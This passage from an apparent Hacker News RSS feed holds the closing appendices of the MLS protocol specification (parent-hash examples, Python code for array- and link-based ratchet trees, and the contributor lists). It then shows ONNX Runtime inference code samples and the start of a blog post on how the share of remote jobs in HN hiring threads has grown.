<li id="appendix-A-5.1">A creates a group with B, ..., H, as well as some members outside this subtree<a href="#appendix-A-5.1">¬∂</a>
</li>
        <li id="appendix-A-5.2">F sends an empty Commit, setting Y and its ancestors<a href="#appendix-A-5.2">¬∂</a>
</li>
        <li id="appendix-A-5.3">
          <p id="appendix-A-5.3.1">D removes B and C, with the following effects:<a href="#appendix-A-5.3.1">¬∂</a></p>
<ul>
<li id="appendix-A-5.3.2.1">Blank the direct paths of B and C<a href="#appendix-A-5.3.2.1">¬∂</a>
</li>
            <li id="appendix-A-5.3.2.2">Set X, the top node, and any further nodes in the direct path of D<a href="#appendix-A-5.3.2.2">¬∂</a>
</li>
          </ul>
</li>
        <li id="appendix-A-5.4">Someone outside this subtree removes G, blanking the direct path of G<a href="#appendix-A-5.4">¬∂</a>
</li>
        <li id="appendix-A-5.5">A adds a new member at B with a partial Commit, adding B as unmerged at X<a href="#appendix-A-5.5">¬∂</a>
</li>
      </ul>
<p id="appendix-A-6">To construct the tree in <a href="#evolution-tree">Figure 13</a>:<a href="#appendix-A-6">¬∂</a></p>
<ul>
<li id="appendix-A-7.1">A creates a group with B, C, and D<a href="#appendix-A-7.1">¬∂</a>
</li>
        <li id="appendix-A-7.2">B sends a full Commit, setting X and Y<a href="#appendix-A-7.2">¬∂</a>
</li>
        <li id="appendix-A-7.3">D removes C, setting Z and Y<a href="#appendix-A-7.3">¬∂</a>
</li>
        <li id="appendix-A-7.4">
          <p id="appendix-A-7.4.1">B adds a new member at C with a full Commit<a href="#appendix-A-7.4.1">¬∂</a></p>
<ul>
<li id="appendix-A-7.4.2.1">The Add proposal adds C as unmerged at Z and Y<a href="#appendix-A-7.4.2.1">¬∂</a>
</li>
            <li id="appendix-A-7.4.2.2">The path in the Commit resets X and Y, clearing Y's unmerged leaves<a href="#appendix-A-7.4.2.2">¬∂</a>
</li>
          </ul>
</li>
      </ul>
<p id="appendix-A-8">To construct the tree in <a href="#parent-hash-tree">Figure 21</a>:<a href="#appendix-A-8">¬∂</a></p>
<ul>
<li id="appendix-A-9.1">A creates a group with B, ..., G<a href="#appendix-A-9.1">¬∂</a>
</li>
        <li id="appendix-A-9.2">A removes F in a full Commit, setting T, U, and W<a href="#appendix-A-9.2">¬∂</a>
</li>
        <li id="appendix-A-9.3">E sends an empty Commit, setting Y and W<a href="#appendix-A-9.3">¬∂</a>
</li>
        <li id="appendix-A-9.4">A adds a new member at F in a partial Commit, adding F as unmerged at Y and W<a href="#appendix-A-9.4">¬∂</a>
</li>
      </ul>
</section>
<section id="ph-evolution">
      <h2 id="name-evolution-of-parent-hashes">
<a href="#appendix-B">Appendix B. </a><a href="#name-evolution-of-parent-hashes">Evolution of Parent Hashes</a>
      </h2>
<p id="appendix-B-1">To better understand how parent hashes are maintained, let's look in detail at
how they evolve in a small group.  Consider the following sequence of
operations:<a href="#appendix-B-1">¬∂</a></p>
<ol start="1" type="1" id="appendix-B-2">
        <li id="appendix-B-2.1">A initializes a new group<a href="#appendix-B-2.1">¬∂</a>
</li>
        <li id="appendix-B-2.2">A adds B to the group with a full Commit<a href="#appendix-B-2.2">¬∂</a>
</li>
        <li id="appendix-B-2.3">B adds C and D to the group with a full Commit<a href="#appendix-B-2.3">¬∂</a>
</li>
        <li id="appendix-B-2.4">C sends an empty Commit<a href="#appendix-B-2.4">¬∂</a>
</li>
      </ol>
<span id="name-building-a-four-member-tree"></span><figure id="figure-30">
        <div id="appendix-B-3.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="144" text-anchor="middle" version="1.1" viewBox="0 0 432 144" width="432">
              <path d="M 216,48 L 216,64" fill="none" stroke="black"></path>
              <path d="M 376,48 L 376,64" fill="none" stroke="black"></path>
              <path d="M 200,64 L 232,64" fill="none" stroke="black"></path>
              <path d="M 360,64 L 392,64" fill="none" stroke="black"></path>
              <path d="M 32,78 L 48,78" fill="none" stroke="black"></path>
              <path d="M 32,82 L 48,82" fill="none" stroke="black"></path>
              <path d="M 128,78 L 144,78" fill="none" stroke="black"></path>
              <path d="M 128,82 L 144,82" fill="none" stroke="black"></path>
              <path d="M 288,78 L 304,78" fill="none" stroke="black"></path>
              <path d="M 288,82 L 304,82" fill="none" stroke="black"></path>
              <path d="M 232,64 L 240,80" fill="none" stroke="black"></path>
              <path d="M 252,104 L 256,112" fill="none" stroke="black"></path>
              <path d="M 392,64 L 400,80" fill="none" stroke="black"></path>
              <path d="M 192,80 L 200,64" fill="none" stroke="black"></path>
              <path d="M 240,112 L 244,104" fill="none" stroke="black"></path>
              <path d="M 352,80 L 360,64" fill="none" stroke="black"></path>
              <polygon fill="black" points="312,80 300,74.4 300,85.6" transform="rotate(0,304,80)"></polygon>
              <polygon fill="black" points="152,80 140,74.4 140,85.6" transform="rotate(0,144,80)"></polygon>
              <polygon fill="black" points="56,80 44,74.4 44,85.6" transform="rotate(0,48,80)"></polygon>
              <g>
                <text x="216" y="36">Y</text>
                <text x="380" y="36">Y'</text>
                <text x="88" y="100">X</text>
                <text x="188" y="100">X'</text>
                <text x="256" y="100">_=Z</text>
                <text x="348" y="100">X'</text>
                <text x="412" y="100">Z'</text>
                <text x="80" y="116">/</text>
                <text x="96" y="116">\</text>
                <text x="176" y="116">/</text>
                <text x="192" y="116">\</text>
                <text x="336" y="116">/</text>
                <text x="352" y="116">\</text>
                <text x="400" y="116">/</text>
                <text x="416" y="116">\</text>
                <text x="8" y="132">A</text>
                <text x="72" y="132">A</text>
                <text x="104" y="132">B</text>
                <text x="168" y="132">A</text>
                <text x="200" y="132">B</text>
                <text x="232" y="132">C</text>
                <text x="264" y="132">D</text>
                <text x="328" y="132">A</text>
                <text x="360" y="132">B</text>
                <text x="392" y="132">C</text>
                <text x="424" y="132">D</text>
              </g>
            </svg><p><a href="#appendix-B-3.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-30">Figure 30</a>:
<a href="#name-building-a-four-member-tree">Building a Four-Member Tree to Illustrate Parent Hashes</a>
        </figcaption></figure>
<p id="appendix-B-4">Then the parent hashes associated to the nodes will be updated as follows (where
we use the shorthand <code>ph</code> for parent hash, <code>th</code> for tree hash, and <code>osth</code> for
original sibling tree hash):<a href="#appendix-B-4">¬∂</a></p>
<ol start="1" type="1" id="appendix-B-5">
        <li id="appendix-B-5.1">
          <p id="appendix-B-5.1.1">A adds B: set X<a href="#appendix-B-5.1.1">¬∂</a></p>
<ul>
<li id="appendix-B-5.1.2.1">
              <code>A.parent_hash = ph(X) = H(X, ph="", osth=th(B))</code><a href="#appendix-B-5.1.2.1">¬∂</a>
</li>
          </ul>
</li>
        <li id="appendix-B-5.2">
          <p id="appendix-B-5.2.1">B adds C, D: set B', X', and Y<a href="#appendix-B-5.2.1">¬∂</a></p>
<ul>
<li id="appendix-B-5.2.2.1">
              <code>X'.parent_hash = ph(Y)  = H(Y, ph="", osth=th(Z))</code>,
where <code>th(Z)</code> covers <code>(C, _, D)</code><a href="#appendix-B-5.2.2.1">¬∂</a>
</li>
            <li id="appendix-B-5.2.2.2">
              <code>B'.parent_hash = ph(X') = H(X', ph=X'.parent_hash, osth=th(A))</code><a href="#appendix-B-5.2.2.2">¬∂</a>
</li>
          </ul>
</li>
        <li id="appendix-B-5.3">
          <p id="appendix-B-5.3.1">C sends empty Commit: set C', Z', Y'<a href="#appendix-B-5.3.1">¬∂</a></p>
<ul>
<li id="appendix-B-5.3.2.1">
              <code>Z'.parent_hash = ph(Y') = H(Y', ph="", osth=th(X'))</code>, where
<code>th(X')</code> covers <code>(A, X', B')</code><a href="#appendix-B-5.3.2.1">¬∂</a>
</li>
            <li id="appendix-B-5.3.2.2">
              <code>C'.parent_hash = ph(Z') = H(Z', ph=Z'.parent_hash, osth=th(D))</code><a href="#appendix-B-5.3.2.2">¬∂</a>
</li>
          </ul>
</li>
      </ol>
<p id="appendix-B-6">When a new member joins, they will receive a tree that has the following parent
hash values and compute the indicated parent hash validity relationships:<a href="#appendix-B-6">¬∂</a></p>
<table id="table-15">
        <caption><a href="#table-15">Table 15</a></caption>
<thead>
          <tr>
            <th rowspan="1" colspan="1">Node</th>
            <th rowspan="1" colspan="1">Parent Hash Value</th>
            <th rowspan="1" colspan="1">Valid?</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td rowspan="1" colspan="1">A</td>
            <td rowspan="1" colspan="1">H(X, ph="", osth=th(B))</td>
            <td rowspan="1" colspan="1">No, B changed</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">B'</td>
            <td rowspan="1" colspan="1">H(X', ph=X'.parent_hash, osth=th(A))</td>
            <td rowspan="1" colspan="1">Yes</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">C'</td>
            <td rowspan="1" colspan="1">H(Z', ph=Z'.parent_hash, osth=th(D))</td>
            <td rowspan="1" colspan="1">Yes</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">D</td>
            <td rowspan="1" colspan="1">(none, never sent an UpdatePath)</td>
            <td rowspan="1" colspan="1">N/A</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">X'</td>
            <td rowspan="1" colspan="1">H(Y, ph="", osth=th(Z))</td>
            <td rowspan="1" colspan="1">No, Y and Z changed</td>
          </tr>
          <tr>
            <td rowspan="1" colspan="1">Z'</td>
            <td rowspan="1" colspan="1">H(Y', ph="", osth=th(X'))</td>
            <td rowspan="1" colspan="1">Yes</td>
          </tr>
        </tbody>
      </table>
<p id="appendix-B-8">In other words, the joiner will find the following path-hash links in the tree:<a href="#appendix-B-8">¬∂</a></p>
<span id="name-parent-hash-links-connect-a"></span><figure id="figure-31">
        <div id="appendix-B-9.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="160" text-anchor="middle" version="1.1" viewBox="0 0 112 160" width="112">
              <path d="M 56,48 L 56,64" fill="none" stroke="black"></path>
              <path d="M 56,64 L 72,64" fill="none" stroke="black"></path>
              <path d="M 72,64 L 80,80" fill="none" stroke="black"></path>
              <g>
                <text x="60" y="36">Y'</text>
                <text x="28" y="100">X'</text>
                <text x="92" y="100">Z'</text>
                <text x="32" y="116">\</text>
                <text x="80" y="116">/</text>
                <text x="8" y="132">A</text>
                <text x="44" y="132">B'</text>
                <text x="76" y="132">C'</text>
                <text x="104" y="132">D</text>
              </g>
            </svg><p><a href="#appendix-B-9.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-31">Figure 31</a>:
<a href="#name-parent-hash-links-connect-a">Parent-hash links connect all non-empty parent nodes to leaves</a>
        </figcaption></figure>
<p id="appendix-B-10">Since these chains collectively cover all non-blank parent nodes in the tree,
the tree is parent-hash valid.<a href="#appendix-B-10">¬∂</a></p>
<p id="appendix-B-11">Note that this tree, though valid, contains invalid parent-hash links. If a
client were checking parent hashes top-down from Y', for example, they would
find that X' has an invalid parent hash relative to Y', but that Z' has a valid
parent hash.  Likewise, if the client were checking bottom-up, they would find
that the chain from B' ends in an invalid link from X' to Y'.  These invalid
links are the natural result of multiple clients having committed.<a href="#appendix-B-11">¬∂</a></p>
<p id="appendix-B-12">Note also the way the tree hash and the parent hash interact.  The parent hash
of node C' includes the tree hash of node D.  The parent hash of node Z'
includes the tree hash of X', which covers nodes A and B' (including the parent
hash of B').  Although the tree hash and the parent hash depend on each other,
the dependency relationships are structured so that there is never a circular
dependency.<a href="#appendix-B-12">¬∂</a></p>
<p id="appendix-B-13">In the particular case where a new member first receives the tree for a group
(e.g., in a ratchet tree GroupInfo extension <a href="#ratchet-tree-extension">Section 12.4.3.3</a>), the
parent hashes will be expressed in the tree representation, but the tree hash
need not be.  Instead, the new member will recompute the tree hashes for all the
nodes in the tree, verifying that this matches the tree hash in the GroupInfo
object.  If the tree is valid, then the subtree hashes computed in this
way will align with the inputs needed for parent hash validation (except where
recomputation is needed to account for unmerged leaves).<a href="#appendix-B-13">¬∂</a></p>
</section>
<section id="array-based-trees">
      <h2 id="name-array-based-trees">
<a href="#appendix-C">Appendix C. </a><a href="#name-array-based-trees">Array-Based Trees</a>
      </h2>
<p id="appendix-C-1">One benefit of using complete balanced trees is that they admit a simple
flat array representation.  In this representation, leaf nodes are
even-numbered nodes, with the <code>n</code>-th leaf at <code>2*n</code>.  Intermediate nodes
are held in odd-numbered nodes.  For example, the tree with 8 leaves has
the following structure:<a href="#appendix-C-1">¬∂</a></p>
<span id="name-an-eight-member-tree-repres"></span><figure id="figure-32">
        <div id="appendix-C-2.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="288" text-anchor="middle" version="1.1" viewBox="0 0 400 288" width="400">
              <path d="M 128,112 L 128,128" fill="none" stroke="black"></path>
              <path d="M 224,48 L 224,64" fill="none" stroke="black"></path>
              <path d="M 320,112 L 320,128" fill="none" stroke="black"></path>
              <path d="M 144,64 L 304,64" fill="none" stroke="black"></path>
              <path d="M 96,128 L 160,128" fill="none" stroke="black"></path>
              <path d="M 288,128 L 352,128" fill="none" stroke="black"></path>
              <path d="M 88,176 L 96,192" fill="none" stroke="black"></path>
              <path d="M 160,128 L 168,144" fill="none" stroke="black"></path>
              <path d="M 184,176 L 192,192" fill="none" stroke="black"></path>
              <path d="M 280,176 L 288,192" fill="none" stroke="black"></path>
              <path d="M 304,64 L 312,80" fill="none" stroke="black"></path>
              <path d="M 352,128 L 360,144" fill="none" stroke="black"></path>
              <path d="M 376,176 L 384,192" fill="none" stroke="black"></path>
              <path d="M 64,192 L 72,176" fill="none" stroke="black"></path>
              <path d="M 88,144 L 96,128" fill="none" stroke="black"></path>
              <path d="M 136,80 L 144,64" fill="none" stroke="black"></path>
              <path d="M 160,192 L 168,176" fill="none" stroke="black"></path>
              <path d="M 256,192 L 264,176" fill="none" stroke="black"></path>
              <path d="M 280,144 L 288,128" fill="none" stroke="black"></path>
              <path d="M 352,192 L 360,176" fill="none" stroke="black"></path>
              <g>
                <text x="224" y="36">X</text>
                <text x="128" y="100">X</text>
                <text x="320" y="100">X</text>
                <text x="80" y="164">X</text>
                <text x="176" y="164">X</text>
                <text x="272" y="164">X</text>
                <text x="368" y="164">X</text>
                <text x="56" y="212">X</text>
                <text x="104" y="212">X</text>
                <text x="152" y="212">X</text>
                <text x="200" y="212">X</text>
                <text x="248" y="212">X</text>
                <text x="296" y="212">X</text>
                <text x="344" y="212">X</text>
                <text x="392" y="212">X</text>
                <text x="24" y="244">Node:</text>
                <text x="56" y="244">0</text>
                <text x="80" y="244">1</text>
                <text x="104" y="244">2</text>
                <text x="128" y="244">3</text>
                <text x="152" y="244">4</text>
                <text x="176" y="244">5</text>
                <text x="200" y="244">6</text>
                <text x="224" y="244">7</text>
                <text x="248" y="244">8</text>
                <text x="272" y="244">9</text>
                <text x="292" y="244">10</text>
                <text x="316" y="244">11</text>
                <text x="340" y="244">12</text>
                <text x="364" y="244">13</text>
                <text x="388" y="244">14</text>
                <text x="24" y="276">Leaf:</text>
                <text x="56" y="276">0</text>
                <text x="104" y="276">1</text>
                <text x="152" y="276">2</text>
                <text x="200" y="276">3</text>
                <text x="248" y="276">4</text>
                <text x="296" y="276">5</text>
                <text x="344" y="276">6</text>
                <text x="392" y="276">7</text>
              </g>
            </svg><p><a href="#appendix-C-2.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-32">Figure 32</a>:
<a href="#name-an-eight-member-tree-repres">An Eight-Member Tree Represented as an Array</a>
        </figcaption></figure>
<p id="appendix-C-3">This allows us to compute relationships between tree nodes simply by
manipulating indices, rather than having to maintain complicated structures in
memory. The basic rule is that the high-order bits of parent and child nodes
indices have the following relation (where <code>x</code> is an arbitrary bit string):<a href="#appendix-C-3">¬∂</a></p>
<div id="appendix-C-4">
<pre>parent=01x =&gt; left=00x, right=10x
</pre><p><a href="#appendix-C-4">¬∂</a>
</p></div>
<p id="appendix-C-5">Since node relationships are implicit, the algorithms for adding and removing
nodes at the right edge of the tree are quite simple.  If there are <code>N</code> nodes in
the array:<a href="#appendix-C-5">¬∂</a></p>
<ul>
<li id="appendix-C-6.1">Add: Append <code>N + 1</code> blank values to the end of the array.<a href="#appendix-C-6.1">¬∂</a>
</li>
        <li id="appendix-C-6.2">Remove: Truncate the array to its first <code>(N-1) / 2</code> entries.<a href="#appendix-C-6.2">¬∂</a>
</li>
      </ul>
<p id="appendix-C-7">The following python code demonstrates the tree computations necessary to use an
array-based tree for MLS.<a href="#appendix-C-7">¬∂</a></p>
<div id="appendix-C-8">
<pre># The exponent of the largest power of 2 less than x. Equivalent to:
#   int(math.floor(math.log(x, 2)))
def log2(x):
    if x == 0:
        return 0

    k = 0
    while (x &gt;&gt; k) &gt; 0:
        k += 1
    return k-1

# The level of a node in the tree. Leaves are level 0, their parents
# are level 1, etc. If a node's children are at different levels,
# then its level is the max level of its children plus one.
def level(x):
    if x &amp; 0x01 == 0:
        return 0

    k = 0
    while ((x &gt;&gt; k) &amp; 0x01) == 1:
        k += 1
    return k

# The number of nodes needed to represent a tree with n leaves.
def node_width(n):
    if n == 0:
        return 0
    else:
        return 2*(n - 1) + 1

# The index of the root node of a tree with n leaves.
def root(n):
    w = node_width(n)
    return (1 &lt;&lt; log2(w)) - 1

# The left child of an intermediate node.
def left(x):
    k = level(x)
    if k == 0:
        raise Exception('leaf node has no children')

    return x ^ (0x01 &lt;&lt; (k - 1))

# The right child of an intermediate node.
def right(x):
    k = level(x)
    if k == 0:
        raise Exception('leaf node has no children')

    return x ^ (0x03 &lt;&lt; (k - 1))

# The parent of a node.
def parent(x, n):
    if x == root(n):
        raise Exception('root node has no parent')

    k = level(x)
    b = (x &gt;&gt; (k + 1)) &amp; 0x01
    return (x | (1 &lt;&lt; k)) ^ (b &lt;&lt; (k + 1))

# The other child of the node's parent.
def sibling(x, n):
    p = parent(x, n)
    if x &lt; p:
        return right(p)
    else:
        return left(p)

# The direct path of a node, ordered from leaf to root.
def direct_path(x, n):
    r = root(n)
    if x == r:
        return []

    d = []
    while x != r:
        x = parent(x, n)
        d.append(x)
    return d

# The copath of a node, ordered from leaf to root.
def copath(x, n):
    if x == root(n):
        return []

    d = direct_path(x, n)
    d.insert(0, x)
    d.pop()
    return [sibling(y, n) for y in d]

# The common ancestor of two nodes is the lowest node that is in the
# direct paths of both leaves.
def common_ancestor_semantic(x, y, n):
    dx = set([x]) | set(direct_path(x, n))
    dy = set([y]) | set(direct_path(y, n))
    dxy = dx &amp; dy
    if len(dxy) == 0:
        raise Exception('failed to find common ancestor')

    return min(dxy, key=level)

# The common ancestor of two nodes is the lowest node that is in the
# direct paths of both leaves.
def common_ancestor_direct(x, y, _):
    # Handle cases where one is an ancestor of the other
    lx, ly = level(x)+1, level(y)+1
    if (lx &lt;= ly) and (x&gt;&gt;ly == y&gt;&gt;ly):
      return y
    elif (ly &lt;= lx) and (x&gt;&gt;lx == y&gt;&gt;lx):
      return x

    # Handle other cases
    xn, yn = x, y
    k = 0
    while xn != yn:
       xn, yn = xn &gt;&gt; 1, yn &gt;&gt; 1
       k += 1
    return (xn &lt;&lt; k) + (1 &lt;&lt; (k-1)) - 1
</pre><p><a href="#appendix-C-8">¬∂</a>
</p></div>
</section>
<section id="link-based-trees">
      <h2 id="name-link-based-trees">
<a href="#appendix-D">Appendix D. </a><a href="#name-link-based-trees">Link-Based Trees</a>
      </h2>
<p id="appendix-D-1">An implementation may choose to store ratchet trees in a "link-based"
representation, where each node stores references to its parents and/or
children (as opposed to the array-based representation suggested above, where
these relationships are computed from relationships between nodes' indices in
the array). Such an implementation needs to update these links to maintain the
balanced structure of the tree as the tree is extended to add new members
or truncated when members are removed.<a href="#appendix-D-1">¬∂</a></p>
<p id="appendix-D-2">The following code snippet shows how these algorithms could be implemented in
Python.<a href="#appendix-D-2">¬∂</a></p>
<div id="appendix-D-3">
<pre>class Node:
    def __init__(self, value, left=None, right=None):
        self.value = value    # Value of the node
        self.left = left      # Left child node
        self.right = right    # Right child node

    @staticmethod
    def blank_subtree(depth):
        if depth == 1:
            return Node(None)

        L = Node.blank_subtree(depth-1)
        R = Node.blank_subtree(depth-1)
        return Node(None, left=L, right=R)

    def empty(self):
        L_empty = (self.left == None) or self.left.empty()
        R_empty = (self.right == None) or self.right.empty()
        return (self.value == None) and L_empty and R_empty

class Tree:
    def __init__(self):
        self.depth = 0    # Depth of the tree
        self.root = None  # Root node of the tree, initially empty

    # Add a blank subtree to the right
    def extend(self):
        if self.depth == 0:
            self.depth = 1
            self.root = Node(None)

        L = self.root
        R = Node.blank_subtree(self.depth)
        self.root = Node(None, left=L, right=R)
        self.depth += 1

    # Truncate the right subtree
    def truncate(self):
        if self.root == None:
            return

        if not self.root.right.empty():
            raise Exception("Cannot truncate non-blank subtree")

        self.depth -= 1
        self.root = self.root.left
</pre><p><a href="#appendix-D-3">¬∂</a>
</p></div>
</section>
<section id="contributors">
      <h2 id="name-contributors">
<a href="#name-contributors">Contributors</a>
      </h2>
<address>
        <p><span>Joel Alwen</span></p>
<p><span>Amazon</span></p>

</address>
<address>
        <p><span>Karthikeyan Bhargavan</span></p>
<p><span>Inria</span></p>

</address>
<address>
        <p><span>Cas Cremers</span></p>
<p><span>CISPA</span></p>

</address>
<address>
        <p><span>Alan Duric</span></p>
<p><span>Wire</span></p>

</address>
<address>
        <p><span>Britta Hale</span></p>
<p><span>Naval Postgraduate School</span></p>

</address>
<address>
        <p><span>Srinivas Inguva</span></p>

</address>
<address>
        <p><span>Konrad Kohbrok</span></p>
<p><span>Phoenix R&amp;D</span></p>

</address>
<address>
        <p><span>Albert Kwon</span></p>
<p><span>MIT</span></p>

</address>
<address>
        <p><span>Tom Leavy</span></p>
<p><span>Amazon</span></p>

</address>
<address>
        <p><span>Brendan McMillion</span></p>

</address>
<address>
        <p><span>Marta Mularczyk</span></p>
<p><span>Amazon</span></p>

</address>
<address>
        <p><span>Eric Rescorla</span></p>
<p><span>Mozilla</span></p>

</address>
<address>
        <p><span>Michael Rosenberg</span></p>
<p><span>Trail of Bits</span></p>

</address>
<address>
        <p><span>Th√©ophile Wallez</span></p>
<p><span>Inria</span></p>

</address>
<address>
        <p><span>Thyla van der Merwe</span></p>
<p><span>Royal Holloway, University of London</span></p>

</address>
</section>
<section id="authors-addresses">
      <h2 id="name-authors-addresses">
<a href="#name-authors-addresses">Authors' Addresses</a>
      </h2>
<address>
        <p><span>Richard Barnes</span></p>
<p><span>Cisco</span></p>

</address>
<address>
        <p><span>Benjamin Beurdouche</span></p>
<p><span>Inria &amp; Mozilla</span></p>

</address>
<address>
        <p><span>Raphael Robert</span></p>
<p><span>Phoenix R&amp;D</span></p>

</address>
<address>
        <p><span>Jon Millican</span></p>
<p><span>Meta Platforms</span></p>

</address>
<address>
        <p><span>Emad Omara</span></p>

</address>
<address>
        <p><span>Katriel Cohn-Gordon</span></p>
<p><span>University of Oxford</span></p>

</address>
</section>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Onnx Runtime: ‚ÄúCross-Platform Accelerated Machine Learning‚Äù (134 pts)]]></title>
            <link>https://onnxruntime.ai/</link>
            <guid>36863522</guid>
            <pubDate>Tue, 25 Jul 2023 15:13:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://onnxruntime.ai/">https://onnxruntime.ai/</a>, See on <a href="https://news.ycombinator.com/item?id=36863522">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="v-pills-tabContent">
											<div id="v-pills-python" role="tabpanel" aria-labelledby="v-pills-python-tab">
												<pre><code>import onnxruntime as ort

# Load the model and create InferenceSession
model_path = "path/to/your/onnx/model"
session = ort.InferenceSession(model_path)

# Load and preprocess the input image inputTensor
...

# Run inference
outputs = session.run(None, {"input": inputTensor})
print(outputs)</code>
<a href="https://onnxruntime.ai/docs/get-started/with-python"><i></i>&nbsp;Learn more</a>
											</pre>
											</div>
											<div id="v-pills-java" role="tabpanel" aria-labelledby="v-pills-java-tab">
												<pre><code>import ai.onnxruntime.*;

// Load the model and create InferenceSession
String modelPath = "path/to/your/onnx/model";
OrtEnvironment env = OrtEnvironment.getEnvironment();
OrtSession session = env.createSession(modelPath);

// Load and preprocess the input image inputTensor
...

// Run inference
OrtSession.Result outputs = session.run(inputTensor);
System.out.println(outputs.get(0).getTensor().getFloatBuffer().get(0));</code>
<a href="https://onnxruntime.ai/docs/get-started/with-java"><i></i>&nbsp;Learn more</a>
											</pre>
											</div>
											<div id="v-pills-javascript" role="tabpanel" aria-labelledby="v-pills-javascript-tab">
												<pre><code>import * as ort from "onnxruntime-web";

// Load the model and create InferenceSession
const modelPath = "path/to/your/onnx/model";
const session = await ort.InferenceSession.create(modelPath);

// Load and preprocess the input image to inputTensor
...

// Run inference
const outputs = await session.run({ input: inputTensor });
console.log(outputs);</code>
<a href="https://onnxruntime.ai/docs/get-started/with-javascript"><i></i>&nbsp;Learn more</a>
											</pre>
											</div>
											<div id="v-pills-cpp" role="tabpanel" aria-labelledby="v-pills-cpp-tab">
												<pre><code>#include "onnxruntime_cxx_api.h"

// Load the model and create InferenceSession
Ort::Env env;
std::string model_path = "path/to/your/onnx/model";
Ort::Session session(env, model_path, Ort::SessionOptions{ nullptr });

// Load and preprocess the input image to 
// inputTensor, inputNames, and outputNames
...

// Run inference
std::vector<ort::value> outputTensors =
 session.Run(Ort::RunOptions{nullptr}, 
 			inputNames.data(), 
			&amp;inputTensor, 
			inputNames.size(), 
			outputNames.data(), 
			outputNames.size());

const float* outputDataPtr = outputTensors[0].GetTensorMutableData<float>();
std::cout &lt;&lt; outputDataPtr[0] &lt;&lt; std::endl;</float></ort::value></code>
<a href="https://onnxruntime.ai/docs/get-started/with-cpp"><i></i>&nbsp;Learn more</a>
											</pre>
											</div>
											<div id="v-pills-cs" role="tabpanel" aria-labelledby="v-pills-cs-tab">
												<pre><code>using Microsoft.ML.OnnxRuntime;

// Load the model and create InferenceSession
string model_path = "path/to/your/onnx/model";
var session = new InferenceSession(model_path);

// Load and preprocess the input image to inputTensor
...

// Run inference
var outputs = session.Run(inputTensor).ToList();
Console.WriteLine(outputs[0].AsTensor<float>()[0]);</float></code>
<a href="https://onnxruntime.ai/docs/get-started/with-csharp"><i></i>&nbsp;Learn more</a>
											</pre>
											</div>
										</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The remote work dominates on HN:Who is hiring? ‚Äì 69% jobs in 2023 are remote (352 pts)]]></title>
            <link>https://blog.spatial.chat/tracking-hackernews-shifting-preferences-for-remote-jobs-over-5-years/</link>
            <guid>36863280</guid>
            <pubDate>Tue, 25 Jul 2023 14:59:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.spatial.chat/tracking-hackernews-shifting-preferences-for-remote-jobs-over-5-years/">https://blog.spatial.chat/tracking-hackernews-shifting-preferences-for-remote-jobs-over-5-years/</a>, See on <a href="https://news.ycombinator.com/item?id=36863280">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
              <p>In the <a href="https://blog.spatial.chat/missing-piece-of-the-remote-work-tech-stack/">previous</a> post, we shared the reasons for the deception of a universal remote work environment. Many creative collaborations happen outside the scheduled interactions, and collocation speeds up the collaboration exchange. In real life, collaboration often happens spontaneously and informally, and working in close physical proximity can facilitate this exchange. That motivates some <a href="https://fortune.com/2023/05/05/openai-ceo-sam-altman-remote-work-mistake-return-to-office/">leaders</a> believe that remote work can result in a loss of creativity.</p><p>The covid-19 pandemic has drastically changed the landscape of work in the tech industry. Many companies have had to quickly transition to remote work, which has presented a unique set of challenges. Companies have had to adjust to new communication protocols, manage distributed teams, and ensure secure remote access to data and applications. To fully understand the impact of remote work, it is necessary to look beyond the surface level and examine how the remote environment has become entrenched over time.</p><h2 id="unraveling-5-year-hiring-patterns-and-insights">Unraveling 5-Year Hiring Patterns and Insights</h2><p>We decided to start with a tech market and examine the reaction to the post-Covid era, delve into the data, and extract insights that shed light on the changing preferences of remote work within the <a href="https://news.ycombinator.com/">HackerNews community</a>. We analyzed thousands of job listings at Ask HN: <code>Who is hiring?</code> section to better understand the preferences of candidates and the requirements of the employees. We analyzed the data from 2018 to June 2023</p><p>Based on the data, we can observe the following trends:</p><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-4.png" alt="" loading="lazy" width="2000" height="640" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-4.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-4.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-4.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-4.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>In 2018, approximately 23% of job listings on HackerNews were for remote work positions. In 2019, there was a slight increase in the percentage of remote work positions, with approximately 29% of job listings being for remote work.</p><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-3.png" alt="" loading="lazy" width="2000" height="645" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-3.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-3.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-3.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-3.png 2400w" sizes="(min-width: 720px) 720px"></figure><figure><img src="https://blog.spatial.chat/content/images/2023/07/image-9.png" alt="" loading="lazy" width="2000" height="525" srcset="https://blog.spatial.chat/content/images/size/w600/2023/07/image-9.png 600w, https://blog.spatial.chat/content/images/size/w1000/2023/07/image-9.png 1000w, https://blog.spatial.chat/content/images/size/w1600/2023/07/image-9.png 1600w, https://blog.spatial.chat/content/images/size/w2400/2023/07/image-9.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>In 2020, the trend continued with a further decrease in job postings for non-remote positions (3,087) and a significant increase in job postings for remote positions (4,277). This suggests that the COVID-19 pandemic, which led to a surge in remote work across various industries, also influenced the HackerNews community's preferences. May was the first month the number of remote work 